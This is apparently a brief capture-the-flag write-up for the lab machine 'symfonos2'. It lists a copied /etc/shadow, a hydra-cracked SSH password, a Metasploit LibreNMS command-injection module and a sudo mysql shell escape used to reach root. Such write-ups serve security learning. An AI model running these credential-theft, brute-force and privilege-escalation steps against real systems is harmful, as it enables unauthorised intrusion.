# found in log.txt - 
------------------
```
root@symfonos2:~# cat /etc/shadow > /var/backups/shadow.bak
root@symfonos2:~# cat /etc/samba/smb.conf

Set the user and group under which the server will run.
User                            aeolus
Group                           aeolus

We want clients to be able to login with "anonymous" as well as "ftp"
UserAlias                     anonymous ftp
```

# found users -
--------------
cronos
aeolus


# found password for `aeolus` for ssh using `hydra` and `rockyou.txt`
aeolus:sergioteamo

logged in as aeolus !

# privesc -
------------
3 users in machine - 
- root
- cronus
- aeolus

# ssh port-forwarding - 
`ssh -L 8080:localhost:8080 aeolus@10.10.10.17`

# horizontal priv esc (aeolus to cronus)
used metasploit - `search librenms`
exploit - `linux/http/librenms_addhost_cmd_inject`


# priv esc to root - 
mysql program exploitation from `gtfobins` - `sudo mysql -e '\! /bin/sh'`